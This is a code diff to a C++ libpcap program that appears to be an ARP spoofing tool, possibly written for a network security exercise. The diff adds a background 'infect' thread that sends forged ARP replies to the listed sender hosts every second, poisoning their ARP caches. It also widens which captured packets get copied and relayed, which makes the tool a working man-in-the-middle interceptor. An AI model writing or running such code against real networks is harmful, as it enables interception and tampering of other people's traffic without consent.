@@ -24,6 +24,7 @@ std::vector<uint32_t> Ip_vec;
 std::vector<Mac> Mac_vec;
 pcap_t* handle;
 pthread_mutex_t mutex;
+uint32_t flowlen;
 
 uint32_t parseIp(const char* str) {
 	uint8_t temp[4];
@@ -57,8 +58,9 @@ void sendpacket(pcap_t* handle,Mac eth_dmac,Mac eth_smac,Mac arp_smac,Ip arp_sip
 	packet.arp_.sip_ = htonl(arp_sip);
 	packet.arp_.tmac_ = arp_tmac;
 	packet.arp_.tip_ = htonl(arp_tip);
-	
+	pthread_mutex_lock(&mutex);
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	pthread_mutex_unlock(&mutex);
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
@@ -78,9 +80,27 @@ void *send_where_req(void* iter)
 	Ip tip=Ip(*(uint32_t*)iter);
 	while(1)
 	{
-		pthread_mutex_lock(&mutex);
+		//pthread_mutex_lock(&mutex);
 		sendpacket(handle,Mac::broadcastMac(),dev_MAC,dev_MAC,dev_IP,Mac::nullMac(),tip,ArpHdr::Request);
-		pthread_mutex_unlock(&mutex);
+		//pthread_mutex_unlock(&mutex);
+		std::this_thread::sleep_for(std::chrono::seconds(1));
+	}
+}
+
+void *infect(void*)
+{
+	while(1)
+	{
+		printf("infectall\n");
+		for(int i=0;i<flowlen;i++)
+		{
+			Ip sip=Ip(Ip_vec[senderIp[i]]);
+			Ip tip=Ip(Ip_vec[targetIp[i]]);
+			Mac smac=Mac_vec[senderIp[i]];
+			//Mac tmac=Mac_vec[targetIp[i]];
+			//printf("%d %d\n",senderIp[i],targetIp[i]);
+			sendpacket(handle,smac,dev_MAC,dev_MAC,tip,smac,sip,ArpHdr::Reply);
+		}
 		std::this_thread::sleep_for(std::chrono::seconds(1));
 	}
 }
@@ -92,9 +112,9 @@ void *wait_and_reply(void* iter)
 	Ip sip=Ip(Ip_vec[senderIp[i]]);
 	Ip tip=Ip(Ip_vec[targetIp[i]]);
 	Mac smac=Mac_vec[senderIp[i]];
-	pthread_mutex_lock(&mutex);
+	//pthread_mutex_lock(&mutex);
 	sendpacket(handle,smac,dev_MAC,dev_MAC,tip,smac,sip,ArpHdr::Reply);
-	pthread_mutex_unlock(&mutex);
+	//pthread_mutex_unlock(&mutex);
 	delete (uint32_t*)iter;
 	return NULL;
 }
@@ -159,7 +179,7 @@ int main(int argc, char* argv[]) {
 		targetIp.push_back(t);
 		Ip_set.insert(t);
 	}
-	uint32_t flowlen=senderIp.size();
+	flowlen=senderIp.size();
 	for(int i=0;i<flowlen;i++)
 	{
 		senderIp[i]=std::distance(Ip_set.begin(), Ip_set.find(senderIp[i]));
@@ -196,6 +216,7 @@ int main(int argc, char* argv[]) {
 		printf("%s\n",((std::string)Mac_vec[i]).data());
 	}
 	*/
+	/*
 	for(int i=0;i<flowlen;i++)
 	{
 		Ip sip=Ip(Ip_vec[senderIp[i]]);
@@ -204,6 +225,12 @@ int main(int argc, char* argv[]) {
 		//Mac tmac=Mac_vec[targetIp[i]];
 		//printf("%d %d\n",senderIp[i],targetIp[i]);
 		sendpacket(handle,smac,dev_MAC,dev_MAC,tip,smac,sip,ArpHdr::Reply);
+	}
+	*/
+	pthread_t infect_thread;
+	if(pthread_create(&infect_thread, NULL, infect,NULL)) {
+    	fprintf(stderr, "Error while creating thread\n");
+		return -1;
 	}
 	const u_char* packet_data;
 	while(1)
@@ -222,7 +249,7 @@ int main(int argc, char* argv[]) {
 			uint32_t ptip=ntohl(*(uint32_t*)(packet_data+0x1e));
 			for(int i=0;i<flowlen;i++)
 			{
-				if(Ip_vec[senderIp[i]]==psip&&Ip_vec[targetIp[i]]==ptip)
+				if(Ip_vec[senderIp[i]]==psip&&Ip_vec[targetIp[i]]!=dev_IP)
 				{
 					u_char* copy_packet_data=(u_char*)malloc(header->caplen);
 					memcpy(copy_packet_data,packet_data,header->caplen);
@@ -264,5 +291,6 @@ int main(int argc, char* argv[]) {
 			}
 		}
 	}
+	pthread_cancel(infect_thread);
 	pcap_close(handle);
 }
